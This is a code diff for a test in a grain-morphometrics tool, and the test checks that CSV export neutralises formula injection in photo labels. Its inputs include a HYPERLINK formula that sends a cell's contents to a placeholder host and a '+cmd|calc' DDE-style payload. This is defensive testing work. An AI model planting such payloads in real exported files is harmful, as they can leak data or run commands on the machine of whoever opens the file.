@@ -4,6 +4,7 @@ import { writeFileSync } from 'node:fs';
 import { computeSedimentStats } from '../../src/modules/sedimentStats';
 import { exportPooledGrainsCsv } from '../../src/modules/siteAnalysis';
 import type { GrainMorphometrics } from '../../src/types/index';
+import { squareGrainSession } from '../../tests/helpers/squareSession';
 
 const g = (id: number, b: number, extra: Partial<GrainMorphometrics> = {}): GrainMorphometrics => ({
   id, areaPx: Math.PI * b * b / 4, centroidX: 50, centroidY: 50, aAxisPx: b * 1.5, bAxisPx: b, dEqPx: b,
@@ -25,31 +26,23 @@ it('degenerate stats', () => {
   expect(Number.isNaN(r0.areaWeightedB.D50)).toBe(true);
 });
 
-it('csv formula injection via photo label', () => {
-  const session = {
-    getResult: () => ({ grains: [g(1, 10)], masks: new Int32Array(100 * 100).fill(0).map((_, i) => (i % 100 > 40 && i % 100 < 60 && i > 4000 && i < 6000 ? 1 : 0)), width: 100, height: 100 }), getCalibration: () => undefined, getExcludeBorder: () => false,
-    workingImage: { effectiveScaleFactor: 1, width: 100, height: 100 }, getWorkingMasks: () => new Int32Array(100 * 100),
-  };
-  const label = '=HYPERLINK("http://example.invalid/?"&A1,"open").jpg';
-  const label2 = '+cmd|calc.jpg';
-  let csv = '';
+it('csv formula injection via photo label', async () => {
+  // Real sessions (the export reads hulls, outlines and calibration from them).
+  const session = () => squareGrainSession([20, 24, 28]);
   try {
-    // @ts-expect-error minimal fake session
-    csv = (exportPooledGrainsCsv([{ photoId: 'p1', label, included: true, session }, { photoId: 'p2', label: label2, included: true, session }]) as Blob) && '';
-  } catch (e) { log.csvError = String(e); }
-  log.csvLabelSample = csv;
-});
-
-it('csv text', async () => {
-  const session = {
-    getResult: () => ({ grains: [g(1, 10)], masks: new Int32Array(100 * 100).fill(0).map((_, i) => (i % 100 > 40 && i % 100 < 60 && i > 4000 && i < 6000 ? 1 : 0)), width: 100, height: 100 }), getCalibration: () => undefined, getExcludeBorder: () => false,
-    workingImage: { effectiveScaleFactor: 1, width: 100, height: 100 }, getWorkingMasks: () => new Int32Array(100 * 100),
-  };
-  try {
-    // @ts-expect-error minimal fake session
-    const blob = exportPooledGrainsCsv([{ photoId: 'p1', label: '=1+2.jpg', included: true, session }, { photoId: 'p2', label: '@SUM(1).jpg', included: true, session }]);
-    const t = await blob.text();
-    log.csvLines = t.split('\n').slice(1).map((l) => l.split(',').slice(0, 3).join(','));
-  } catch (e) { log.csvError2 = String(e); }
+    const blob = exportPooledGrainsCsv([
+      { photoId: 'p1', label: '=HYPERLINK("http://example.invalid/?"&A1,"open").jpg', included: true, session: session() },
+      { photoId: 'p2', label: '+cmd|calc.jpg', included: true, session: session() },
+      { photoId: 'p3', label: '=1+2.jpg', included: true, session: session() },
+      { photoId: 'p4', label: '@SUM(1).jpg', included: true, session: session() },
+    ]);
+    const lines = (await blob.text()).split('\n').filter((l) => l !== '' && !l.startsWith('#'));
+    // photo_id / photo label cells of the first data row of each photo: guarded with a leading '.
+    log.csvLabelCells = [...new Set(lines.slice(1).map((l) => l.split(',').slice(0, 2).join(',')))];
+    expect(lines.slice(1).every((l) => !/^[=+\-@]/.test(l))).toBe(true);
+  } catch (e) {
+    log.csvError = String(e);
+    throw e;
+  }
   writeFileSync('validation/oracle/edge_cases.json', JSON.stringify(log, null, 2));
 });
